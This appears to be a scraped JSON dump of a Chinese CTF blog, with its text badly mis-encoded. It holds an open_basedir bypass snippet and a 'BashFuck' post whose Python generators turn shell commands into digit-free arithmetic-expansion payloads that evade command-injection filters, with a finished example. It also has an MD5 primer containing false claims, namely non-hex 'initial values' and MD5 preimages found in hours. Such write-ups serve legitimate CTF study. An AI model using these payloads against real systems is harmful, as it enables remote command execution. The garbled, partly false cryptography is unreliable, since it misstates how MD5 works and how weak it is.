printf(\u0026#39;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#39;, ini_get(\u0026#39;open_basedir\u0026#39;)); $re = bindtextdomain(\u0026#39;xxx\u0026#39;, $_GET[\u0026#39;dir\u0026#39;]); var_dump($re); ?\u0026gt; reference #\r1ã€ https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm 2ã€ https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkYL5AKeGIhxqGOjeD 3ã€ https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/ 4ã€ https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/","section":"Posts","summary":"","title":"Open_basedirç»•è¿‡","type":"posts"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","section":"Tags","summary":"","title":"æ–‡ä»¶åŒ…å«","type":"tags"},{"content":"0x0eå‰è¨€ #\ræœ¬æ¥æ˜¯åœ¨CTFåˆ·åˆ·é¢˜ç›®ï¼Œç„¶åæœ‰ä¸ªçŸ¥è¯†ç‚¹ä¸å¤ªæ˜ç™½æ‰€ä»¥å°±å»æ‰¾ç€äº†lazyå¸ˆå‚…é—®äº†ä¸€ä¸‹ï¼Œç»“æœå‘äº†ä¸€ä¸ªbashfuckçš„çŸ¥è¯†ç‚¹è¿‡æ¥ï¼ˆxï¼Œæœ¬æ¥ä¸€ä¸ªç®€å•çš„ç»•è¿‡å´æœ‰äº†æ–°çš„æ€è·¯ï¼Œç´¢æ€§æ¥è®°å½•ä¸€ä¸‹ã€‚\n#æ³¨æ„ï¼šå› ä¸ºdebianã€Ubuntuç³»ç»Ÿçš„shè½¯è¿æ¥æ˜¯åˆ°dashçš„ï¼Œcentosçš„shè½¯é“¾æ¥è¿æ¥åˆ°bashï¼Œä½†æ˜¯kaliçš„zshä¸æ˜¯å¾ˆå…¼å®¹dashæ‰€ä»¥IFSå°±è§£æä¸äº†ï¼Œè¿˜æ˜¯ç›´æ¥ç”¨ç©ºæ ¼ä»£æ›¿å³å¯\n0x01common_oct #\rè¿™ä¸ªå°±æ˜¯æœ€å¸¸è§„çš„å¯ä»¥ç”¨åå…­è¿›åˆ¶ï¼Œæˆ–è€…å…«è¿›åˆ¶æ¥æ‰§è¡Œå‘½ä»¤\nsum_data = \u0026#39;\u0026#39; str1 = input(\u0026#34;è¯·è¾“å…¥è¦è½¬åŒ–çš„å‘½ä»¤:\u0026#34;) str1 = str1.strip() # å»é™¤é¦–å°¾ç©ºæ ¼ data_len = len(str1) # åˆ¤æ–­æ€»é•¿åº¦æ¥å¾ªç¯ for i in range(data_len): data = ord(str1[i]) if data == ord(\u0026#39; \u0026#39;): # æ£€æŸ¥ç©ºæ ¼å­—ç¬¦ sum_data += \u0026#34;\u0026#39;$IFS$\u0026#39;\u0026#34; else: data_8 = oct(data)[2:] final_data = \u0026#39;\\\\\u0026#39; + data_8 sum_data += final_data print(\u0026#34;common_oct\u0026#34;) print(\u0026#34;$\u0026#39;\u0026#34; + sum_data + \u0026#34;\u0026#39;\u0026#34;) å‡ºæ¥ç›´æ¥ä½¿ç”¨å³å¯ï¼Œåœ¨kalié‡Œé¢çš„ifsç›´æ¥ç”¨ç©ºæ ¼ä»£æ›¿å³å¯ exampleï¼š\n$\u0026#39;\\154\\163\u0026#39; #= ls 0x02bashfuck_x #\rè¿ç”¨åˆ°çš„åŸç†å°±æ˜¯ç®—æœ¯æ‹“å±•$(())ï¼Œè¿™ä¸ªçš„è¿”å›å€¼ä¸º0ï¼Œå¹¶ä¸”å¯ä»¥æœ‰è¿™ç§ç”¨æ³•$((1\u0026lt;\u0026lt;1)#2binary)æ¥æ„é€ å‡ºä¸€äº›å‘½ä»¤ è¿˜æ˜¯æ‹¿lsæ¥ä¸¾ä¾‹å­ï¼Œå¦‚æœä¸å»åˆ©ç”¨äºŒè¿›åˆ¶æ¥æ„é€ å¯ä»¥è¿™ä¹ˆå†™\n\u0026#34;$\u0026#34;\u0026#39;\u0026#39;\\\u0026#39;\u0026#39;\\\u0026#39;$(($((1))54))\u0026#39;\\\u0026#39;$(($((1))63))\\\u0026#39; æ„é€ å‡ºæ¥å°±æ˜¯common_octçš„å†™æ³• ç„¶åè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶æ¥æ„é€ \n$\\\u0026#39;\\\\$(($((1\u0026lt;\u0026lt;1))#10011010))\\\\$(($((1\u0026lt;\u0026lt;1))#10100011))\\\u0026#39; å› ä¸ºç›¸å¯¹äºå‰é¢çš„ä½ æ„é€ å‡º54å•Šæˆ–è€…æ˜¯å…¶ä»–æ•°å­—æ¯”è¾ƒéº»çƒ¦ï¼Œè€Œåœ¨æ¢å§¬å¸ˆå‚…çš„wikiä¸‹é¢è¯´æ˜äº†å‡ ç§å¯ä»¥è¡¨ç¤º0å’Œ1çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç”¨01æ¥ä»£æ›¿èƒ½åˆ©ç”¨pyå¿«é€Ÿçš„å¾—å‡ºç»“æœå¹¶ä¸”å¯ä»¥å®ç°æ— æ•°å­—æ¥æ‰“ ä¸€äº›å¯¹åº”ï¼š\n\u0026gt;echo ${#} \u0026gt;0 \u0026gt;echo ${##} \u0026gt;1 \u0026gt;echo ${#_} \u0026gt;1 \u0026gt;echo ${_} \u0026gt;1 \u0026gt;echo ${?} \u0026gt;0 \u0026gt;echo ${?#} \u0026gt;1 ç­‰ç­‰éƒ½å¯ä»¥ç”¨æ¥æ„é€  ä¸‹é¢é™„ä¸Šç›¸å…³å‡½æ•°\ndef bashfuck_x(cmd, form): bash_str = \u0026#39;\u0026#39; for c in cmd: bash_str += f\u0026#39;\\\\\\\\$(($((1\u0026lt;\u0026lt;1))#{bin(int(get_oct(c)))[2:]}))\u0026#39; payload_bit = bash_str payload_zero = bash_str.replace(\u0026#39;1\u0026#39;, \u0026#39;${##}\u0026#39;) # ç”¨ ${##} æ¥æ›¿æ¢ 1 payload_c = bash_str.replace(\u0026#39;1\u0026#39;, \u0026#39;${##}\u0026#39;).replace(\u0026#39;0\u0026#39;, \u0026#39;${#}\u0026#39;) # ç”¨ ${#} æ¥æ›¿æ¢ 0 if form == \u0026#39;bit\u0026#39;: payload_bit = \u0026#39;$0\u0026lt;\u0026lt;\u0026lt;$0\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; + payload_bit + \u0026#39;\\\\\\\u0026#39;\u0026#39; return info(payload_bit) elif form == \u0026#39;zero\u0026#39;: payload_zero = \u0026#39;$0\u0026lt;\u0026lt;\u0026lt;$0\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; + payload_zero + \u0026#39;\\\\\\\u0026#39;\u0026#39; return info(payload_zero) elif form == \u0026#39;c\u0026#39;: payload_c = \u0026#39;${!#}\u0026lt;\u0026lt;\u0026lt;${!#}\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; + payload_c + \u0026#39;\\\\\\\u0026#39;\u0026#39; return info(payload_c) ç„¶åè¿™é‡Œéœ€è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œä½ ä¼šå‘ç°ä½ ç›´æ¥æ‰§è¡Œå‘½ä»¤æ˜¯æ²¡åŠæ³•æ‰§è¡Œçš„ï¼Œè¿™é‡Œæ¢å§¬å¸ˆå‚…ä¹Ÿæ˜¯ç»™å‡ºäº†ç›¸å…³çš„è¿æ¥ https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html æ€»çš„æ¥è¯´å°±æ˜¯æ‰©å±•é¡ºåºï¼Œæˆ‘ä»¬åœ¨å…«è¿›åˆ¶è½¬ä¹‰çš„æ—¶å€™å·²ç»æ‰©å±•äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥åé¢ä¸ä¼šå†æ¬¡è§£æ æ‰€ä»¥è¿™é‡Œå°±ç”¨æ ‡å‡†è¾“å‡ºæ¥å®Œæˆè§£æ\n/bin/bash\u0026lt;\u0026lt;\u0026lt; æ‰€ä»¥æœ€åçš„playloadçš„å‰é¢è¦åŠ ä¸Š:$0\u0026lt;\u0026lt;\u0026lt; $0 å¯ä»¥è¡¨ç¤ºå½“å‰è„šæœ¬çš„æ–‡ä»¶åï¼Œåœ¨ç»ˆç«¯ä¸­ï¼Œ$0å…¶å®å°±æ˜¯bashæœ¬èº«ã€‚\n0x03bashfuck_y #\rè¿™é‡Œå’Œä¸Šé¢çš„éƒ½å·®ä¸å¤šåªæ˜¯å¯¹-1çš„å–åè¿›è¡Œäº†åˆ©ç”¨\noct_list = [ # æ„é€ æ•°å­— 0-7 ä»¥ä¾¿äºåç»­å…«è¿›åˆ¶å½¢å¼çš„æ„é€  \u0026#39;$(())\u0026#39;, # 0 \u0026#39;$((~$(($((~$(())))$((~$(())))))))\u0026#39;, # 1 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 2 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 3 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 4 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 5 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 6 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 7 ] è¿™æ ·å°±å¯ä»¥ä½¿ç”¨$(())å»æ„é€ $'\\xxx\\xxx\\xxx\\xxx'\nå†å¼•å…¥æˆ‘ä»¬å‰é¢æåˆ°çš„ï¼Œå˜é‡èµ‹å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾çš„ç”¨$(())æ‹¿åˆ°sh\nbashFuck = \u0026#39;\u0026#39; bashFuck += \u0026#39;__=$(())\u0026#39; # set __ to 0 bashFuck += \u0026#39;\u0026amp;\u0026amp;\u0026#39; # splicing bashFuck += \u0026#39;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; # got \u0026#39;sh\u0026#39; # bashFuck = __=$(())\u0026amp;\u0026amp;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39; å¾—åˆ°æˆ‘ä»¬ç¬¬å››ç§playload:\nCommand:ls Charset : ! $ \u0026amp; \u0026#39; ( ) \u0026lt; = \\ _ { } ~ Total Used: 13 Total length = 393 Payload = __=$(())\u0026amp;\u0026amp;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\u0026lt;\\\u0026lt;\\\u0026lt;\\$\\\u0026#39;\\\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\\u0026#39; å‚è€ƒæ–‡ç« ï¼š https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/%E6%B5%85%E8%B0%88bashfuck/","section":"Posts","summary":"","title":"æµ…è°ˆBashFuck","type":"posts"},{"content":"0x00å‰è¨€ #\rå› ä¸ºkengwangå¸ˆå‚…åœ¨æ–°ç”Ÿèµ›å‡ºäº†è¿™ä¸ªé¢˜ç›®ï¼Œä½†æ˜¯ä¹‹å‰æ²¡å­¦è¿‡wwwï¼Œè¿™å°±æ¥å­¦å­¦ã€‚\n0x01 ä»€ä¹ˆæ˜¯hashé•¿åº¦æ‹“å±•æ”»å‡» #\rhashé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œæ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ç”±äºhashçš„ç”Ÿæˆæœºåˆ¶ä½¿å¾—æˆ‘ä»¬å¯ä»¥äººä¸ºçš„åœ¨åŸå…ˆçš„æ˜æ–‡åŸºç¡€ä¸Šæ·»åŠ æ–°çš„æ‹“å±•å­—ç¬¦ï¼Œä»è€Œä½¿å¾—åŸæœ¬çš„åŠ å¯†é“¾å˜é•¿ï¼Œè¿›ä¸€æ­¥æ§åˆ¶åŠ å¯†é“¾çš„æœ€åä¸€èŠ‚ï¼Œä½¿å¾—æˆ‘ä»¬å¾—ä»¥æ§åˆ¶æœ€ç»ˆçš„ç»“æœã€‚\nè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹hashç®—æ³•ã€‚\nhashç®—æ³• #\rhashç®—æ³•åˆå«åšæ•£åˆ—ç®—æ³•ã€‚æ˜¯ä¸€ç§æŠŠä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²åŠ å¯†ä¸ºå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²çš„åŠ å¯†ç®—æ³•ï¼Œè¯¥ç®—æ³•ç”Ÿæˆçš„å¯†æ–‡å°±æ˜¯æ•£åˆ—å€¼ã€‚è¿™é‡Œæ‹¿ä¸€ä¸ªæ¯”è¾ƒå…¸å‹çš„MD5æ¥åšä¾‹å­æ¥è¯¦ç»†åˆ†æä¸€ä¸‹\n0X02MD5åŠ å¯† #\rMD5 introduction #\rMD5 æ¶ˆæ¯æ‘˜è¦ç®—æ³•æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„å“ˆå¸Œå‡½æ•°ï¼Œå¯ç”Ÿæˆ 128ä½å“ˆå¸Œå€¼ã€‚ MD5 ç”±Ronald Rivestäº 1991å¹´è®¾è®¡ï¼Œç”¨äºå–ä»£æ—©æœŸçš„å“ˆå¸Œå‡½æ•°MD4Â ï¼Œå¹¶äº 1992 å¹´è¢«æŒ‡å®šä¸º RFC 1321ã€‚\nMD5 å¯ç”¨ä½œæ ¡éªŒå’Œæ¥éªŒè¯æ•°æ®å®Œæ•´æ€§ï¼Œé˜²æ­¢æ„å¤–æŸåã€‚å†å²ä¸Šå®ƒè¢«å¹¿æ³›ç”¨ä½œåŠ å¯†å“ˆå¸Œå‡½æ•°ï¼›ç„¶è€Œï¼Œå®ƒè¢«å‘ç°å­˜åœ¨å¹¿æ³›çš„æ¼æ´ã€‚å®ƒä»ç„¶é€‚ç”¨äºå…¶ä»–éåŠ å¯†ç›®çš„ï¼Œä¾‹å¦‚ç”¨äºç¡®å®šåˆ†åŒºæ•°æ®åº“ä¸­ç‰¹å®šå¯†é’¥çš„åˆ†åŒºï¼Œå¹¶ä¸”ç”±äºæ¯”æœ€æ–°çš„å®‰å…¨æ•£åˆ—ç®—æ³•æ›´ä½çš„è®¡ç®—è¦æ±‚ï¼Œå®ƒå¯èƒ½æ˜¯é¦–é€‰ã€‚\nMD5 proccess #\rè¿™é‡Œæˆ‘å°†MD5åŠ å¯†åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«æ˜¯ï¼š\nå¡«å…… åˆ†å— å¤šè½®å‹ç¼© æœ€åè¾“å‡ºï¼Œè¿™é‡Œæˆ‘ä¸€ä¸€ä¸¾ä¾‹ å¡«å…… #\rè¿™é‡Œæˆ‘è´´ä¸€ä¸‹å¢¨å¸ˆå‚…çš„è„šæœ¬\ndef text_to_binary(text_str): binary_str = \u0026#39; \u0026#39;.join(format(ord(x), \u0026#39;b\u0026#39;) for x in text_str) return binary_str text_input = \u0026#39;0123456789abcdef\u0026#39; binary_output = text_to_binary(text_input) print(\u0026#39;binary result is:{0}\u0026#39;.format(binary_output)) å…·ä½“çš„ä»£ç é€»è¾‘åº”è¯¥å¾ˆæ¸…æ™°\ninputæ˜¯0-f å°†inputè½¬æ¢ä¸º2è¿›åˆ¶å†…å®¹ è¿™é‡Œçš„è¾“å‡ºä¸º 00110000 00110001 00110010 00110011 00110100 00110101 00110110 00110111 00111000 00111001 01100001 01100010 01100011 01100100 01100101 01100110 è¿™é‡Œä¾¿æ˜¯128ä½çš„äºŒè¿›åˆ¶å­—ç¬¦ æˆ–è€…æˆ‘ä»¬å¯ä»¥ç”¨010æ¥æŸ¥çœ‹æ–‡ä»¶ï¼Œè¿™é‡Œä¸¾ä¾‹ è¿™é‡Œå°±æ˜¯9*8=72ä¸ªäºŒè¿›åˆ¶å­—ç¬¦\nå¡«å……çš„rule #\rä»€ä¹ˆå«å¡«å……å‘¢ï¼Œå¡«å……çš„è¿‡ç¨‹å°±æ˜¯è®²2è¿›åˆ¶å­—ç¬¦ä¸ªæ•°å¡«å……åˆ°512æ¯”ç‰¹çš„æ•´æ•°å€å¤§å°ï¼Œå¹¶ä¸”éœ€è¦åœ¨æœ€åé¢é¢„ç•™64ä½æ¥å›ºå®šè¡¨ç¤ºåŸå§‹æ•°æ®å¤§å°ï¼Œå³å°ç«¯åœ¨å‰æ ¼å¼ï¼Œä¸­é—´å‰©ä¸‹çš„æ¯”ç‰¹ç¬¬ä¸€ä¸ªå¡«1å…¶ä½™çš„è¡¥0\né‚£ä¹ˆå¯¹äºä»¥ä¸Šçš„ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ™å°±å¯ä»¥æŒ‰ç…§è¿™ä¸ªå¡«å……è§„åˆ™æ¥è¿›è¡Œå¡«å……ã€‚\nç–‘é—®ï¼Ÿ #\rè¿™é‡Œæå‡ºä¸€ä¸ªå°é—®é¢˜ï¼Œå¦‚æœè¯´ä½ è¾“å…¥çš„æ•°æ®åˆšå¥½ä¸º512bitå‘¢ï¼Œé‚£ä¹ˆä»–æ˜¯å¦ä¼šè¿›è¡Œå¡«å……ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå› ä¸ºæ²¡æœ‰æœ€å64ä½å›ºå®šå€¼æ¥è¡¨ç¤ºåŸå§‹æ•°æ®å¤§å°ï¼Œé‚£ä¹ˆå°±ä¼šå¡«å……åˆ°1024-512=512ä¸ªæ•°æ®ï¼ˆå½“ç„¶åŒ…å«è¿›æœ€å64ä½å›ºå®šæ•°æ®ï¼‰ã€‚ åŒ…æ‹¬åœ¨æœ€åä¸è¶³64ä½æ—¶ä¹Ÿéœ€è¦è¡¥é½åˆ°ä¸‹ä¸€ä¸ª512æ•´æ•°å€çš„æ•°æ®ã€‚ æœ€åè¡¥çš„64ä½çš„å€¼å°±æ˜¯å‰é¢æ•°æ®é•¿åº¦çš„å¤§å°ï¼Œä¾‹å¦‚abcdï¼Œåˆ™å°±æ˜¯4*8=32ï¼Œè½¬åŒ–æˆäºŒè¿›åˆ¶å°±æ˜¯100000ã€‚\nåˆ†å— #\ré‚£ä¹ˆåœ¨å‰é¢è¿›è¡Œå¡«å……åè‚¯å®šå¯ä»¥è¿›è¡Œåˆ†å—ï¼Œå¹¶ä¸”åˆ†å—è‚¯å®šå¯ä»¥æ˜¯512çš„æ•´æ•°å€ã€‚ å¹¶ä¸”è¿™ä¸ªæ—¶å€™ä¼šç»™å‡ºå››ç»„å¹»æ•°æ¥ä½œä¸ºmd5çš„åˆå§‹å€¼ ä¾‹å¦‚ 0x1a8ba2ba 0x18s62abs 0x17ais27a2 0x1a662b1a\nå¤šè½®å‹ç¼© #\rè¿‡ç¨‹ï¼šæŠŠå½“å‰çš„å››ç»„æ•£åˆ—å€¼å„å¤åˆ¶ä¸€ä»½ï¼Œåˆ†åˆ«ç”¨abcdæ¥è¡¨ç¤º ç„¶ååœ¨æ¯ä¸€ä¸ªæ•°æ®å—ä¸­è¿›è¡Œå››è½®æ“ä½œï¼Œå…¶ä¸­åŒ…å«ä¸ï¼Œæˆ–ï¼Œéï¼Œå’Œå¾ªç¯ä½ç§»æ“ä½œï¼Œæ¯æ¬¡æŠŠabcdæ›´æ–°å››æ¬¡ã€‚ æ‰€ä»¥æ¯ä¸ªå¤§å—éƒ½å¯ä»¥å¯¹abcdçš„å€¼è¿›è¡Œæ›´æ–°16æ¬¡ã€‚\nè¿™é‡Œæˆ‘è´´ä¸€ä¸ªjavaå®ç°md5åŠ å¯†çš„è„šæœ¬\nimport java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MD5 { public static void main(String[] args) { String input = \u0026#34;Hello, World!\u0026#34;; String encrypted = encryptToMD5(input); System.out.println(\u0026#34;Original String: \u0026#34; + input); System.out.println(\u0026#34;MD5 Encrypted String: \u0026#34; + encrypted); } public static String encryptToMD5(String input) { try { MessageDigest md = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); md.update(input.getBytes()); byte[] digest = md.digest(); StringBuilder sb = new StringBuilder(); for (byte b : digest) { sb.append(String.format(\u0026#34;%02x\u0026#34;, b \u0026amp; 0xff)); } return sb.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); return null; } } } MD5æ”»å‡» #\rç¬¬ä¸€åŸåƒæ”»å‡»ï¼ˆFirst Preimage Attackï¼‰ #\rç¬¬ä¸€åŸåƒæ”»å‡»çš„ç›®æ ‡æ˜¯ä»ç»™å®šçš„å“ˆå¸Œå€¼â„hä¸­æ‰¾åˆ°ç›¸åº”çš„æ¶ˆæ¯mï¼Œä½¿å¾—å½“è¿™ä¸ªæ¶ˆæ¯è¢«è¾“å…¥åˆ°å“ˆå¸Œå‡½æ•°ï¼ˆä¾‹å¦‚MD5ï¼‰æ—¶ï¼Œä¼šäº§ç”Ÿç»™å®šçš„å“ˆå¸Œå€¼â„ã€‚\nåœ¨MD5çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè™½ç„¶æ‰¾åˆ°ç¬¬ä¸€åŸåƒçš„ç†è®ºå¤æ‚åº¦æ˜¯O(2^128)ï¼ˆç”±äºMD5ç”Ÿæˆ128ä½çš„å“ˆå¸Œå€¼ï¼‰ï¼Œä½†æ˜¯ç”±äºMD5çš„å®‰å…¨æ€§é—®é¢˜ï¼Œå®é™…ä¸Šçš„æ”»å‡»å¤æ‚åº¦è¿œä½äºç†è®ºå€¼ã€‚ä¾‹å¦‚ï¼Œç ”ç©¶å·²ç»æ˜¾ç¤ºï¼Œä½¿ç”¨ç°ä»£ç¡¬ä»¶å’Œç®—æ³•ï¼Œå¯ä»¥åœ¨å‡ å°æ—¶æˆ–å‡ å¤©å†…æ‰¾åˆ°MD5çš„ç¬¬ä¸€åŸåƒã€‚\nç¬¬äºŒåŸåƒæ”»å‡»ï¼ˆSecond Preimage Attackï¼‰ #\rç¬¬äºŒåŸåƒæ”»å‡»çš„ç›®æ ‡æ˜¯å¯¹äºç»™å®šçš„è¾“å…¥æ¶ˆæ¯m1â€‹ï¼Œæ‰¾åˆ°å¦ä¸€ä¸ªä¸åŒçš„æ¶ˆæ¯m2â€‹ï¼Œä½¿å¾—ä¸¤ä¸ªæ¶ˆæ¯äº§ç”Ÿç›¸åŒçš„å“ˆå¸Œå€¼ã€‚è¿™æ„å‘³ç€å¯¹äºå“ˆå¸Œå€¼â„ï¼Œå­˜åœ¨ä¸¤ä¸ªä¸åŒçš„æ¶ˆæ¯m1â€‹å’Œm2â€‹æ»¡è¶³ï¼š\nMD5(m1â€‹)=MD5(m2â€‹)=h åŒæ ·ï¼Œç†è®ºä¸Šï¼Œç¬¬äºŒåŸåƒæ”»å‡»çš„å¤æ‚åº¦æ˜¯O(2^128)ï¼Œä½†ç”±äºMD5çš„å¼±ç‚¹ï¼Œå®é™…æ”»å‡»çš„å¤æ‚åº¦æ¯”ç†è®ºå€¼ä½å¾—å¤šã€‚å°½ç®¡å¦‚æ­¤ï¼Œç›¸å¯¹äºç¬¬ä¸€åŸåƒæ”»å‡»ï¼Œç¬¬äºŒåŸåƒæ”»å‡»ä»ç„¶æ˜¯ä¸€ä¸ªæ›´ä¸ºå›°éš¾çš„é—®é¢˜ã€‚\nç¢°æ’æ”»å‡» #\rç¢°æ’æ”»å‡»æ˜¯ä¸€ç§å¯†ç å­¦æ”»å‡»ï¼Œç›®çš„æ˜¯æ‰¾åˆ°ä¸¤ä¸ªä¸åŒçš„è¾“å…¥æ¶ˆæ¯ï¼ˆä¹Ÿç§°ä¸ºåŸæ–‡ï¼‰ï¼Œè¿™ä¸¤ä¸ªæ¶ˆæ¯åœ¨ç»è¿‡åŒä¸€å“ˆå¸Œå‡½æ•°è®¡ç®—åï¼Œä¼šäº§ç”Ÿç›¸åŒçš„å“ˆå¸Œå€¼ã€‚æ¢å¥è¯è¯´ï¼Œæ”»å‡»è€…è¯•å›¾æ‰¾åˆ°ä¸¤ä¸ªä¸åŒçš„æ¶ˆæ¯ m1â€‹ å’Œ m2â€‹ï¼Œä½¿å¾—ï¼š\nhash(m1â€‹)=hash(m2â€‹)\nåœ¨MD5çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç”±äºMD5å“ˆå¸Œå€¼ä¸º128ä½ï¼Œç†è®ºä¸Šçš„ç¢°æ’æ”»å‡»å¤æ‚åº¦ä¸ºO(2^128)ã€‚ç„¶è€Œï¼Œç”±äºMD5çš„è®¾è®¡ç¼ºé™·å’Œè®¡ç®—ä¸Šçš„ä¼˜åŒ–ï¼Œç°å®ä¸­çš„ç¢°æ’æ”»å‡»æ¯”è¿™ä¸ªç†è®ºå¤æ‚åº¦è¦ä½å¾—å¤šã€‚\nexample #\r2004å¹´ï¼ŒXiaoyun Wangç­‰äººå‘å¸ƒäº†ä¸€ä¸ªç ”ç©¶ï¼ŒæˆåŠŸåœ°æ‰¾åˆ°äº†ä¸¤ä¸ªä¸åŒçš„PDFæ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶åœ¨ç»è¿‡MD5å“ˆå¸Œåäº§ç”Ÿäº†ç›¸åŒçš„å“ˆå¸Œå€¼ã€‚è¿™æ˜¯MD5ç¢°æ’æ”»å‡»çš„æ—©æœŸå’Œæœ€è‘—åçš„ä¾‹å­ã€‚\nå…·ä½“æ¥è¯´ï¼Œè¿™é¡¹ç ”ç©¶æ‰¾åˆ°äº†ä¸¤ä¸ªPDFæ–‡ä»¶ï¼šä¸€ä¸ªæ˜¯æ™®é€šçš„åˆåŒæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå…¶ä¸­åµŒå…¥äº†æ”»å‡»ä»£ç ã€‚å½“è¿™ä¸¤ä¸ªæ–‡ä»¶ç»è¿‡MD5å“ˆå¸Œåï¼Œå®ƒä»¬äº§ç”Ÿäº†ç›¸åŒçš„128ä½å“ˆå¸Œå€¼ã€‚è¿™æ„å‘³ç€ï¼Œå¯¹äºMD5å“ˆå¸Œå€¼æ¥è¯´ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯ä¸å¯åŒºåˆ†çš„ï¼Œå°½ç®¡å®ƒä»¬çš„å†…å®¹æˆªç„¶ä¸åŒã€‚\nè¿™ä¸ªä¾‹å­æ­ç¤ºäº†MD5åœ¨å®é™…åº”ç”¨ä¸­çš„ä¸¥é‡å®‰å…¨é£é™©ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªåˆæ³•æ–‡ä»¶å’Œä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶çš„MD5å“ˆå¸Œå€¼ç›¸åŒï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥è½»æ˜“åœ°ä¼ªè£…åˆæ³•æ–‡ä»¶ï¼Œè¯±ä½¿ç”¨æˆ·æ‰“å¼€æ¶æ„æ–‡ä»¶ï¼Œä»è€Œè¿›è¡Œæ¶æ„æ”»å‡»ã€‚\nç”±äºMD5çš„è¿™ç§å¼±ç‚¹ï¼Œç°åœ¨å¼ºçƒˆå»ºè®®é¿å…ä½¿ç”¨MD5è¿›è¡Œä»»ä½•å®‰å…¨ç›¸å…³çš„åº”ç”¨ï¼Œè€Œåº”é€‰æ‹©æ›´å®‰å…¨çš„å“ˆå¸Œç®—æ³•ï¼Œå¦‚SHA-256æˆ–SHA-3ã€‚è¿™äº›ç®—æ³•åœ¨å½“å‰æ—¶é—´ï¼ˆ2022å¹´1æœˆä¹‹å‰ï¼‰è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œå¹¶ä¸”ä¸å®¹æ˜“å—åˆ°ç¢°æ’æ”»å‡»çš„å¨èƒã€‚\nHash é•¿åº¦æ‹“å±•æ”»å‡» 